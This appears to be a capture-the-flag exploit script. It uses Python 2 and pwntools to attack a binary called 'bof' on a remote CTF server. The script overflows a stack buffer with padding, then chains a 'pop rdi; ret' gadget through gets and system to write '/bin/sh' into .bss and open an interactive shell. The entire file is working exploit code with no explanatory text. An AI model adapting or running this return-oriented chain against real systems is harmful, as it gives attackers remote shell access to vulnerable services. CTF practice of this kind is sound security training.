#!/usr/bin/env python2
from pwn import *
import pwnlib.elf

c = remote('ctf.bitx.tw', 10101)
e = ELF('bof')

ans = '\0' * (0x40 + 8)
ans += p64(0x400723) # pop rdi ; ret
ans += p64(e.bss() + 100)
ans += p64(e.plt['gets'])
ans += p64(0x400723) # pop rdi ; ret
ans += p64(e.bss() + 100)
ans += p64(e.plt['system'])
c.sendline(ans)

ans = '/bin/sh'
c.sendline(ans)

c.interactive()
c.close()
